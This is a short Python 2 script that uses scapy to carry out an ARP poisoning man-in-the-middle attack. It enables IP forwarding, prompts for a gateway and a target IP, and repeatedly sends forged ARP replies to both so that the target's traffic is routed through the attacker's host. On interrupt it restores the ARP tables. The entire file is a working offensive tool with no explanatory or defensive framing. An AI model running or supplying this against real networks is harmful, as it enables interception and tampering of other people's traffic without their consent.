from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print '[*] Restoring targets...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)




def get_mac(ip_address):
	response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
		timeout=2, retry=10)
	for s, r in response:
		return r.getlayer(Ether).src
	return None


gateway_ip	=	raw_input('Gateway IP:		')
target_ip	=	raw_input('Target IP:		')



poison_target		=	ARP()
poison_target.op	=	2
poison_target.psrc	=	gateway_ip
poison_target.pdst	=	target_ip
poison_target.hwdst	=	get_mac(target_ip)

poison_gateway		=	ARP()
poison_gateway.op	=	2
poison_gateway.psrc	=	target_ip
poison_gateway.pdst	=	gateway_ip
poison_gateway.hwdst	=	get_mac(gateway_ip)

print 'Beginning the ARP poison'
while 1:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, get_mac(gateway_ip), target_ip, get_mac(target_ip))
	    print '[*] ARP poison attack finished.'
	    os.kill(os.getpid(), signal.SIGINT)
